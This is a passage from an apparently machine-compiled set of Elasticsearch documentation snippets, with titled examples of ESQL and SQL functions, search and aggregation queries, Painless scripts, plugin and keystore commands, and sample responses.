Elasticsearch ESQL\nDESCRIPTION: This snippet demonstrates how to compute the SHA1 hash of a string field in Elasticsearch using ESQL. It retrieves data from 'sample_data', filters out rows with 'Connection error' messages, calculates the SHA1 hash of the 'message' field, and keeps only the original message and its hash.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/sha1.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM sample_data\n| WHERE message != \"Connection error\"\n| EVAL sha1 = sha1(message)\n| KEEP message, sha1\n```\n\n----------------------------------------\n\nTITLE: Example of EXP Function Usage\nDESCRIPTION: Demonstrates the EXP function with different inputs and compares the results with direct calculations using the E function, showing that EXP(1) equals E() and EXP(2) equals E() * E().\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-math.md#2025-04-21_snippet_9\n\nLANGUAGE: sql\nCODE:\n```\nSELECT EXP(1), E(), EXP(2), E() * E();\n\n     EXP(1)      |       E()       |     EXP(2)     |     E() * E()\n-----------------+-----------------+----------------+------------------\n2.718281828459045|2.718281828459045|7.38905609893065|7.3890560989306495\n```\n\n----------------------------------------\n\nTITLE: Boxplot Aggregation with Compression in Elasticsearch\nDESCRIPTION: This example demonstrates how to use the compression parameter in a boxplot aggregation to control the balance between memory utilization and estimation accuracy.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-boxplot-aggregation.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nGET latency/_search\n{\n  \"size\": 0,\n  \"aggs\": {\n    \"load_time_boxplot\": {\n      \"boxplot\": {\n        \"field\": \"load_time\",\n        \"compression\": 200\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Setting Elasticsearch API Version Compatibility Headers\nDESCRIPTION: Example of setting Content-Type and Accept headers to specify API version compatibility for requests to Elasticsearch 8.0 using the 7.x request and response format.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/api-conventions.md#2025-04-21_snippet_8\n\nLANGUAGE: sh\nCODE:\n```\nContent-Type: application/vnd.elasticsearch+json; compatible-with=7\nAccept: application/vnd.elasticsearch+json; compatible-with=7\n```\n\n----------------------------------------\n\nTITLE: Aggregation Query with Normalized Terms\nDESCRIPTION: Demonstrates how aggregations return normalized values when using a normalized keyword field. The query returns term buckets showing document counts for each normalized value.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/normalizer.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nGET index/_search\n{\n  \"size\": 0,\n  \"aggs\": {\n    \"foo_terms\": {\n      \"terms\": {\n        \"field\": \"foo\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: RRF Search Response with Ranked Results and Aggregations in Elasticsearch\nDESCRIPTION: The response from the Reciprocal Rank Fusion search showing the combined ranking of documents from both text and vector queries, along with the terms aggregation results.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/reciprocal-rank-fusion.md#2025-04-21_snippet_5\n\nLANGUAGE: console-response\nCODE:\n```\n{\n    \"took\": ...,\n    \"timed_out\" : false,\n    \"_shards\" : {\n        \"total\" : 1,\n        \"successful\" : 1,\n        \"skipped\" : 0,\n        \"failed\" : 0\n    },\n    \"hits\" : {\n        \"total\" : {\n            \"value\" : 5,\n            \"relation\" : \"eq\"\n        },\n        \"max_score\" : ...,\n        \"hits\" : [\n            {\n                \"_index\" : \"example-index\",\n                \"_id\" : \"3\",\n                \"_score\" : 0.8333334,\n                \"_source\" : {\n                    \"integer\" : 1,\n                    \"vector\" : [\n                        3\n                    ],\n                    \"text\" : \"rrf rrf rrf\"\n                }\n            },\n            {\n                \"_index\" : \"example-index\",\n                \"_id\" : \"2\",\n                \"_score\" : 0.5833334,\n                \"_source\" : {\n                    \"integer\" : 2,\n                    \"vector\" : [\n                        4\n                    ],\n                    \"text\" : \"rrf rrf\"\n                }\n            },\n            {\n                \"_index\" : \"example-index\",\n                \"_id\" : \"4\",\n                \"_score\" : 0.5,\n                \"_source\" : {\n                    \"integer\" : 2,\n                    \"text\" : \"rrf rrf rrf rrf\"\n                }\n            }\n        ]\n    },\n    \"aggregations\" : {\n        \"int_count\" : {\n            \"doc_count_error_upper_bound\" : 0,\n            \"sum_other_doc_count\" : 0,\n            \"buckets\" : [\n                {\n                    \"key\" : 1,\n                    \"doc_count\" : 3\n                },\n                {\n                    \"key\" : 2,\n                    \"doc_count\" : 2\n                }\n            ]\n        }\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Processing Elasticsearch Search Response in Java\nDESCRIPTION: This snippet demonstrates how to process the response from an Elasticsearch search query. It retrieves the total number of hits, iterates through the search hits, and extracts the source as a map for each hit.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/inference/licenses/reactive-streams-NOTICE.txt#2025-04-22_snippet_2\n\nLANGUAGE: Java\nCODE:\n```\nSearchHits hits = searchResponse.getHits();\nTotalHits totalHits = hits.getTotalHits();\n// the total number of hits, must be interpreted in the context of totalHits.relation\nlong numHits = totalHits.value;\n// whether the number of hits is accurate (EQUAL_TO) or a lower bound of the total (GREATER_THAN_OR_EQUAL_TO)\nTotalHits.Relation relation = totalHits.relation;\nfloat maxScore = hits.getMaxScore();\n\nSearchHit[] searchHits = hits.getHits();\nfor (SearchHit hit : searchHits) {\n    // do something with the SearchHit\n    String index = hit.getIndex();\n    String id = hit.getId();\n    float score = hit.getScore();\n\n    String sourceAsString = hit.getSourceAsString();\n    Map<String, Object> sourceAsMap = hit.getSourceAsMap();\n    String documentTitle = (String) sourceAsMap.get(\"title\");\n    List<Object> users = (List<Object>) sourceAsMap.get(\"user\");\n    Map<String, Object> innerObject = (Map<String, Object>) sourceAsMap.get(\"innerObject\");\n}\n```\n\n----------------------------------------\n\nTITLE: Example Wildcard Query in Elasticsearch\nDESCRIPTION: This example searches for documents where the user.id field contains a term beginning with 'ki' and ending with 'y'. The query includes optional parameters for boosting and rewrite method configuration.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-wildcard-query.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"query\": {\n    \"wildcard\": {\n      \"user.id\": {\n        \"value\": \"ki*y\",\n        \"boost\": 1.0,\n        \"rewrite\": \"constant_score_blended\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Running Automated TDVT Test Suite\nDESCRIPTION: Command to run the automated TDVT testing script that clones the TDVT SDK repo, sets up config files, and launches the TDVT test suite against an Elasticsearch instance.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/sql/connectors/tableau/tdvt/README.md#2025-04-21_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\npython3 ./tdvt_run.py -u \"http://user:pass@elastic-host:9200\" -t <taco dir path>\n```\n\n----------------------------------------\n\nTITLE: Testing Script in Score Context\nDESCRIPTION: Example of running a script in score context to calculate a normalized rank value.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-api-examples.md#2025-04-21_snippet_4\n\nLANGUAGE: console\nCODE:\n```\nPOST /_scripts/painless/_execute\n{\n  \"script\": {\n    \"source\": \"doc['rank'].value / params.max_rank\",\n    \"params\": {\n      \"max_rank\": 5.0\n    }\n  },\n  \"context\": \"score\",\n  \"context_setup\": {\n    \"index\": \"my-index-000001\",\n    \"document\": {\n      \"rank\": 4\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Array Field Transformation with Synthetic _source\nDESCRIPTION: Demonstrates how array fields are transformed when using synthetic _source, moving arrays to leaf fields.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/mapping-source-field.md#2025-04-21_snippet_1\n\nLANGUAGE: json\nCODE:\n```\nPUT idx/_doc/1\n{\n  \"foo\": [\n    {\n      \"bar\": 1\n    },\n    {\n      \"bar\": 2\n    }\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Parsing Date and Extracting Year in ESQL\nDESCRIPTION: This snippet demonstrates how to parse a date string into a date object and then extract the year from it using ESQL functions. It uses DATE_PARSE to convert a string to a date, and DATE_EXTRACT to get the year component.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/date_extract.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW date = DATE_PARSE(\"yyyy-MM-dd\", \"2022-05-06\")\n| EVAL year = DATE_EXTRACT(\"year\", date)\n```\n\n----------------------------------------\n\nTITLE: Basic Dot Expander Configuration in Elasticsearch\nDESCRIPTION: Demonstrates basic configuration of the dot expander processor to convert a field with dots in its name into an object structure.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/dot-expand-processor.md#2025-04-21_snippet_0\n\nLANGUAGE: js\nCODE:\n```\n{\n  \"dot_expander\": {\n    \"field\": \"foo.bar\"\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Pattern Tokenizer to Capture Quoted Text in Elasticsearch\nDESCRIPTION: Example configuring a pattern tokenizer to extract text enclosed in double quotes, even with embedded escaped quotes. Uses a complex regex with capture groups to identify and extract the quoted content.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-pattern-tokenizer.md#2025-04-21_snippet_2\n\nLANGUAGE: text\nCODE:\n```\n\"((?:\\\\\"|[^\"]{1}|\\\\\")*)\"\n```\n\nLANGUAGE: text\nCODE:\n```\n\\\"((?:\\\\\\\\\\\"|[^\\\"]|\\\\\\\\\\\")+)\\\"\n```\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001\n{\n  \"settings\": {\n    \"analysis\": {\n      \"analyzer\": {\n        \"my_analyzer\": {\n          \"tokenizer\": \"my_tokenizer\"\n        }\n      },\n      \"tokenizer\": {\n        \"my_tokenizer\": {\n          \"type\": \"pattern\",\n          \"pattern\": \"\\\"((?:\\\\\\\\\\\"|[^\\\"]|\\\\\\\\\\\")+)\\\"\",\n          \"group\": 1\n        }\n      }\n    }\n  }\n}\n\nPOST my-index-000001/_analyze\n{\n  \"analyzer\": \"my_analyzer\",\n  \"text\": \"\\\"value\\\", \\\"value with embedded \\\\\\\" quote\\\"\"\n}\n```\n\nLANGUAGE: text\nCODE:\n```\n[ value, value with embedded \\\" quote ]\n```\n\n----------------------------------------\n\nTITLE: Creating Elasticsearch Connector with cURL\nDESCRIPTION: Example cURL command to create a connector using the Elasticsearch Connector API. This includes authentication headers and JSON payload for connector configuration.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/api-tutorial.md#2025-04-21_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\ncurl -s -X PUT http://localhost:9200/_connector/my-connector-id \\\n-H \"Authorization: APIKey $APIKEY\" \\\n-H \"Content-Type: application/json\" \\\n-d '{\n  \"name\": \"Music catalog\",\n  \"index_name\":  \"music\",\n  \"service_type\": \"postgresql\"\n}'\n```\n\n----------------------------------------\n\nTITLE: T-test Aggregation with Runtime Field in Elasticsearch\nDESCRIPTION: Demonstrates how to use a runtime field in a t_test aggregation to adjust values before comparison, allowing for more flexible data manipulation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-ttest-aggregation.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nGET node_upgrade/_search\n{\n  \"size\": 0,\n  \"runtime_mappings\": {\n    \"startup_time_before.adjusted\": {\n      \"type\": \"long\",\n      \"script\": {\n        \"source\": \"emit(doc['startup_time_before'].value - params.adjustment)\",\n        \"params\": {\n          \"adjustment\": 10\n        }\n      }\n    }\n  },\n  \"aggs\": {\n    \"startup_time_ttest\": {\n      \"t_test\": {\n        \"a\": {\n          \"field\": \"startup_time_before.adjusted\"\n        },\n        \"b\": {\n          \"field\": \"startup_time_after\"\n        },\n        \"type\": \"paired\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Combining MIN with Inline Functions in ESQL\nDESCRIPTION: Shows how to combine the MIN function with the MV_AVG function to calculate the minimum average of a multivalued column. This example first calculates the average of 'salary_change' values for each row, then finds the minimum of those averages.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/min.md#2025-04-21_snippet_1\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| STATS min_avg_salary_change = MIN(MV_AVG(salary_change))\n```\n\n----------------------------------------\n\nTITLE: Viewing Extraction Service Logs\nDESCRIPTION: These commands use `docker exec` to access and display the extraction service logs from within the Docker container.  They tail both `openresty.log` (request traffic logs) and `tika.log` (tikaserver jar logs) for troubleshooting purposes.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-content-extraction.md#2025-04-21_snippet_10\n\nLANGUAGE: bash\nCODE:\n```\n$ docker exec extraction-service /bin/sh -c \"tail /var/log/openresty.log\"\n$ docker exec extraction-service /bin/sh -c \"tail /var/log/tika.log\"\n```\n\n----------------------------------------\n\nTITLE: Sample Response for Rate Aggregation in Elasticsearch\nDESCRIPTION: This snippet shows the expected response format for a rate aggregation query. It includes bucketed results with key, doc_count, and average price for each month.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-rate-aggregation.md#2025-04-21_snippet_6\n\nLANGUAGE: console\nCODE:\n```\n{\n  ...\n  \"aggregations\" : {\n    \"by_date\" : {\n      \"buckets\" : [\n        {\n          \"key_as_string\" : \"2015/01/01 00:00:00\",\n          \"key\" : 1420070400000,\n          \"doc_count\" : 3,\n          \"avg_price\" : {\n            \"value\" : 495.0\n          }\n        },\n        {\n          \"key_as_string\" : \"2015/02/01 00:00:00\",\n          \"key\" : 1422748800000,\n          \"doc_count\" : 2,\n          \"avg_price\" : {\n            \"value\" : 54.0\n          }\n        },\n        {\n          \"key_as_string\" : \"2015/03/01 00:00:00\",\n          \"key\" : 1425168000000,\n          \"doc_count\" : 2,\n          \"avg_price\" : {\n            \"value\" : 337.5\n          }\n        }\n      ]\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Detecting Step Changes Using CHANGE_POINT in ESQL\nDESCRIPTION: Query that expands a sequence of numbers 1-25, assigns values (0 for numbers <13, 42 for others), and detects change points. The CHANGE_POINT function identifies where significant value changes occur in the sequence.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/commands/examples/change_point.csv-spec/changePointForDocs.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW key=[1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25]\n| MV_EXPAND key\n| EVAL value = CASE(key<13, 0, 42)\n| CHANGE_POINT value ON key\n| WHERE type IS NOT NULL\n```\n\n----------------------------------------\n\nTITLE: Supported Sub-Select Query\nDESCRIPTION: An example of a supported sub-select query that can be flattened into a single SELECT statement in Elasticsearch SQL.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-limitations.md#2025-04-21_snippet_6\n\nLANGUAGE: sql\nCODE:\n```\ninclude-tagged::{sql-specs}/docs/docs.csv-spec[limitationSubSelect]\n```\n\n----------------------------------------\n\nTITLE: Generating Is Not Null Query in Elasticsearch\nDESCRIPTION: This snippet shows how to create a query to check for non-null values in Elasticsearch. It uses an exists query to ensure the pid field is not null.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/eql/src/test/resources/querytranslator_tests.txt#2025-04-21_snippet_26\n\nLANGUAGE: eql\nCODE:\n```\nprocess where pid != null\n```\n\nLANGUAGE: json\nCODE:\n```\n\"must\":[{\"term\":{\"event.category\":{\"value\":\"process\"}}},{\"exists\":{\"field\":\"pid\",\"boost\":1.0}}]\n```\n\n----------------------------------------\n\nTITLE: Implementing Gaussian Decay Function for Price Scoring in Elasticsearch\nDESCRIPTION: This snippet shows how to implement a Gaussian decay function for scoring hotels based on price. It sets the origin at 0 and a scale of 20 Euros, meaning hotels closer to 0 Euros will receive higher scores.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-function-score-query.md#2025-04-21_snippet_9\n\nLANGUAGE: js\nCODE:\n```\n\"gauss\": { <1>\n    \"price\": {\n          \"origin\": \"0\",\n          \"scale\": \"20\"\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Indexing Document with Payloads\nDESCRIPTION: Adds a document containing delimited payload tokens to the index.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-delimited-payload-tokenfilter.md#2025-04-21_snippet_4\n\nLANGUAGE: console\nCODE:\n```\nPOST text_payloads/_doc/1\n{\n  \"text\": \"the|0 brown|3 fox|4 is|0 quick|10\"\n}\n```\n\n----------------------------------------\n\nTITLE: Calculating Elapsed Time Using Numeric 'Now' Parameter in Painless\nDESCRIPTION: Painless script that uses a numeric representation of the current time passed as a parameter to calculate the elapsed time since a datetime field value.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/using-datetime-in-painless.md#2025-04-21_snippet_24\n\nLANGUAGE: painless\nCODE:\n```\nlong now = params['now'];\nZonedDateTime inputDateTime = doc['input_datetime'];\nlong millisDateTime = inputDateTime.toInstant().toEpochMilli();\nlong elapsedTime = now - millisDateTime;\n```\n\n----------------------------------------\n\nTITLE: Using the _size Field in Elasticsearch for Querying, Aggregating, Sorting and Retrieving\nDESCRIPTION: This example demonstrates creating documents and then using the _size field in various operations including range queries, aggregations, sorting, and retrieving the field in search responses using both the fields parameter and script fields.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/mapper-size-usage.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\n# Example documents\nPUT my-index-000001/_doc/1\n{\n  \"text\": \"This is a document\"\n}\n\nPUT my-index-000001/_doc/2\n{\n  \"text\": \"This is another document\"\n}\n\nGET my-index-000001/_search\n{\n  \"query\": {\n    \"range\": {\n      \"_size\": {                      <1>\n        \"gt\": 10\n      }\n    }\n  },\n  \"aggs\": {\n    \"sizes\": {\n      \"terms\": {\n        \"field\": \"_size\",             <2>\n        \"size\": 10\n      }\n    }\n  },\n  \"sort\": [\n    {\n      \"_size\": {                      <3>\n        \"order\": \"desc\"\n      }\n    }\n  ],\n  \"fields\": [\"_size\"],                <4>\n  \"script_fields\": {\n    \"size\": {\n      \"script\": \"doc['_size']\"        <5>\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Calculating MD5 Hashes with ESQL\nDESCRIPTION: Example query that filters out connection error messages, calculates MD5 hashes of the message field, and returns only the message and corresponding MD5 hash columns. The query demonstrates the usage of WHERE, EVAL, and KEEP clauses in combination with the md5() function.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/md5.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM sample_data\n| WHERE message != \"Connection error\"\n| EVAL md5 = md5(message)\n| KEEP message, md5\n```\n\n----------------------------------------\n\nTITLE: Computing Median for Odd Number of Values in ESQL\nDESCRIPTION: Example showing how MV_MEDIAN function calculates the median value for an array with odd number of elements. The function returns the middle value after sorting.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/mv_median.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW a=[3, 5, 1]\n| EVAL median_a = MV_MEDIAN(a)\n```\n\n----------------------------------------\n\nTITLE: Calculating Hyperbolic Tangent in ESQL\nDESCRIPTION: This snippet demonstrates how to use the TANH function in ESQL to calculate the hyperbolic tangent of a number. It creates a row with a single value and then applies the TANH function to that value.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/tanh.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW a=1.8\n| EVAL tanh=TANH(a)\n```\n\n----------------------------------------\n\nTITLE: Removing Japanese (kuromoji) Analysis Plugin from Elasticsearch\nDESCRIPTION: This command removes the Japanese (kuromoji) analysis plugin from Elasticsearch. The node must be stopped before removing the plugin.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/analysis-kuromoji.md#2025-04-21_snippet_1\n\nLANGUAGE: sh\nCODE:\n```\nsudo bin/elasticsearch-plugin remove analysis-kuromoji\n```\n\n----------------------------------------\n\nTITLE: Multiple Statistical Aggregates with GROUP BY\nDESCRIPTION: Example showing how to use multiple statistical aggregate functions (KURTOSIS and SKEWNESS) with salary data, grouped by gender.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-syntax-select.md#2025-04-21_snippet_18\n\nLANGUAGE: sql\nCODE:\n```\nSELECT gender AS g, KURTOSIS(salary) AS k, SKEWNESS(salary) AS s FROM emp GROUP BY gender;\n```\n\n----------------------------------------\n\nTITLE: Handling Missing Values in Terms Aggregation\nDESCRIPTION: Demonstrates how to handle documents with missing values in terms aggregation by specifying a default value. Documents without a value in the specified field will be grouped into a bucket with the provided missing value.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-terms-aggregation.md#2025-04-21_snippet_17\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"aggs\": {\n    \"tags\": {\n      \"terms\": {\n        \"field\": \"tags\",\n        \"missing\": \"N/A\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Importing Certificates into Single JKS Keystore\nDESCRIPTION: This snippet imports the certificates into a single Java Keystore (JKS), allowing for separate key-password management for each certificate.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/libs/ssl-config/src/test/resources/certs/README.txt#2025-04-21_snippet_9\n\nLANGUAGE: bash\nCODE:\n```\n# 10. Import Certs into single JKS keystore with separate key-password\n\nfor Cert in cert1 cert2 \ndo\n    keytool -importkeystore -noprompt \\\n            -srckeystore $Cert/$Cert.p12 -srcstoretype PKCS12 -srcstorepass p12-pass  \\\n            -destkeystore cert-all/certs.jks -deststoretype jks -deststorepass jks-pass\n    keytool -keypasswd -keystore cert-all/certs.jks -alias $Cert -keypass p12-pass -new key-pass -storepass jks-pass\ndone\n```\n\n----------------------------------------\n\nTITLE: Indexing GeoJSON Circle with Circle Processor\nDESCRIPTION: This example demonstrates indexing a document containing a circle defined in GeoJSON format and retrieving the resulting polygon. The circle processor converts the GeoJSON circle to a GeoJSON polygon representation while maintaining the specified error distance.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/ingest-circle-processor.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nPUT circles/_doc/2?pipeline=polygonize_circles\n{\n  \"circle\": {\n    \"type\": \"circle\",\n    \"radius\": \"40m\",\n    \"coordinates\": [30, 10]\n  }\n}\n\nGET circles/_doc/2\n```\n\n----------------------------------------\n\nTITLE: Setting EC2 Discovery Credentials in Elasticsearch Keystore\nDESCRIPTION: Shell commands to add AWS access and secret keys to the Elasticsearch keystore for EC2 discovery authentication.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/discovery-ec2-usage.md#2025-04-21_snippet_1\n\nLANGUAGE: sh\nCODE:\n```\nbin/elasticsearch-keystore add discovery.ec2.access_key\nbin/elasticsearch-keystore add discovery.ec2.secret_key\n```\n\n----------------------------------------\n\nTITLE: Calculating Hypotenuse Using HYPOT in ESQL\nDESCRIPTION: Demonstrates the usage of HYPOT function to calculate the hypotenuse of a right triangle with sides 3.0 and 4.0. The function accepts any numeric values as inputs and returns a double value. Returns null when dealing with infinite values.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/hypot.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW a = 3.0, b = 4.0\n| EVAL c = HYPOT(a, b)\n```\n\n----------------------------------------\n\nTITLE: Converting Numeric Values to Datetime using TO_DATETIME in ESQL\nDESCRIPTION: This example shows how TO_DATETIME function interprets numeric values as milliseconds since the Unix epoch (January 1, 1970). The integer values 0 and 1 are converted to their corresponding datetime representations.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/to_datetime.md#2025-04-21_snippet_1\n\nLANGUAGE: esql\nCODE:\n```\nROW int = [0, 1]\n| EVAL dt = TO_DATETIME(int)\n```\n\n----------------------------------------\n\nTITLE: Filtering Data with IS NOT NULL in ESQL\nDESCRIPTION: This query demonstrates how to use the IS NOT NULL operator to filter employees based on whether they have been rehired. It then counts the number of matching employee numbers.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/operators/is_not_null.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| WHERE is_rehired IS NOT NULL\n| STATS COUNT(emp_no)\n```\n\n----------------------------------------\n\nTITLE: Disabling Automatic Synonym Phrase Queries\nDESCRIPTION: Demonstrates how to control synonym expansion behavior by setting auto_generate_synonyms_phrase_query to false. This creates boolean queries instead of phrase queries for multi-term synonyms.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-query-string-query.md#2025-04-21_snippet_18\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n   \"query\": {\n       \"query_string\" : {\n           \"default_field\": \"title\",\n           \"query\" : \"ny city\",\n           \"auto_generate_synonyms_phrase_query\" : false\n       }\n   }\n}\n```\n\n----------------------------------------\n\nTITLE: Using Keyed Response with Geo-distance Aggregation\nDESCRIPTION: Demonstrates how to use the keyed parameter to return geo-distance aggregation buckets as a hash with unique string keys rather than an array.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-geodistance-aggregation.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nPOST /museums/_search?size=0\n{\n  \"aggs\": {\n    \"rings_around_amsterdam\": {\n      \"geo_distance\": {\n        \"field\": \"location\",\n        \"origin\": \"POINT (4.894 52.3760)\",\n        \"ranges\": [\n          { \"to\": 100000 },\n          { \"from\": 100000, \"to\": 300000 },\n          { \"from\": 300000 }\n        ],\n        \"keyed\": true\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Multiple Inner Hits for Collapsed Results\nDESCRIPTION: Demonstrates requesting multiple representations of collapsed hits by defining multiple inner_hits configurations. This example retrieves both the largest responses and most recent responses for each user.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/collapse-search-results.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nGET /my-index-000001/_search\n{\n  \"query\": {\n    \"match\": {\n      \"message\": \"GET /search\"\n    }\n  },\n  \"collapse\": {\n    \"field\": \"user.id\",                   <1>\n    \"inner_hits\": [\n      {\n        \"name\": \"largest_responses\",      <2>\n        \"size\": 3,\n        \"sort\": [\n          {\n            \"http.response.bytes\": {\n              \"order\": \"desc\"\n            }\n          }\n        ]\n      },\n      {\n        \"name\": \"most_recent\",             <3>\n        \"size\": 3,\n        \"sort\": [\n          {\n            \"@timestamp\": {\n              \"order\": \"desc\"\n            }\n          }\n        ]\n      }\n    ]\n  },\n  \"sort\": [\n    \"http.response.bytes\"\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Calculating Spatial Centroid using ST_CENTROID_AGG in ESQL\nDESCRIPTION: This snippet demonstrates how to use the ST_CENTROID_AGG function in Elasticsearch's ESQL to calculate the spatial centroid over a field with spatial point geometry type. It queries the 'airports' index and computes the centroid of the 'location' field.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/st_centroid_agg.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM airports\n| STATS centroid=ST_CENTROID_AGG(location)\n```\n\n----------------------------------------\n\nTITLE: Computing Aggregate Statistics with ESQL\nDESCRIPTION: ESQL query that computes the average and maximum number of languages from an employees table using STATS operation. The query calculates AVG(languages) as avg_lang and MAX(languages) as max_lang.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/commands/examples/stats.csv-spec/statsCalcMultipleValues.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| STATS avg_lang = AVG(languages), max_lang = MAX(languages)\n```\n\n----------------------------------------\n\nTITLE: Significant Text Aggregation with Source Fields in Elasticsearch\nDESCRIPTION: This example shows how to use the source_fields parameter in a significant_text aggregation. It's useful when the indexed field name differs from the original JSON field names due to complex mappings like copy_to.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-significanttext-aggregation.md#2025-04-21_snippet_6\n\nLANGUAGE: console\nCODE:\n```\nGET news/_search\n{\n  \"query\": {\n    \"match\": {\n      \"custom_all\": \"elasticsearch\"\n    }\n  },\n  \"aggs\": {\n    \"tags\": {\n      \"significant_text\": {\n        \"field\": \"custom_all\",\n        \"source_fields\": [ \"content\", \"title\" ]\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Elasticsearch Plugins with Proxy Settings\nDESCRIPTION: Example of an 